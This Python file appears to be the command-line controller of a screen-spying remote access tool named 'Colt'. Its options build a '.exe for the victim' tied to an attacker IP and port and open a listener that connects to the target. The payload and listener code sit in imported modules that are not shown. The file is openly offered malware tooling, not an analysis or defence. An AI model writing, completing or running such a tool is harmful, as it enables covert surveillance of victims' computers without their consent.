# BY WINTERREX

import os
import argparse
import Main.window_runner as client
import Main.generate_exe as ge

#COLORS INITIALIZE
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BV = "\033[38;5;57m"
CYAN = "\033[38;5;69m"
RESET = "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n')
    banner = [

       " ░█████╗░░█████╗░██╗░░░░░████████╗",
       " ██╔══██╗██╔══██╗██║░░░░░╚══██╔══╝",
       " ██║░░╚═╝██║░░██║██║░░░░░░░░██║░░░",
       " ██║░░██╗██║░░██║██║░░░░░░░░██║░░░",
       " ╚█████╔╝╚█████╔╝███████╗░░░██║░░░",
       " ░╚════╝░░╚════╝░╚══════╝░░░╚═╝░░░"
    ]
    colors = [57, 63, 69, 75, 81, 87]
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]
        print(''.join(f'\033[38;5;{txt_color}m{char}' for char in line))

clear_screen()
print_banner()

payload_type = None

while True:
    colt_cm = input(f"{BV}Colt >> {RESET}").split()
    if not colt_cm:
        continue

    parser = argparse.ArgumentParser(description="A screen spyer?? NOTE:CHANGE DESC")
    parser.add_argument("-EXE", "--exe", action="store_true", help="generate .exe for the victim")
    parser.add_argument("-IP", "--ip", help="generate .exe for the victim")
    parser.add_argument("-PORT", "--port", help="generate .exe for the victim")
    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target.")
    parser.add_argument("-CLEAR", "--clear", action="store_true", help="Clear ui.")

    args = parser.parse_args(colt_cm)

    if args.exe:
        print("Generating .exe file for the user...")
        ge.create_exe(args.ip, args.port)

    elif args.connect:
        client.listener(args.ip, args.port)

    elif args.clear:
        clear_screen()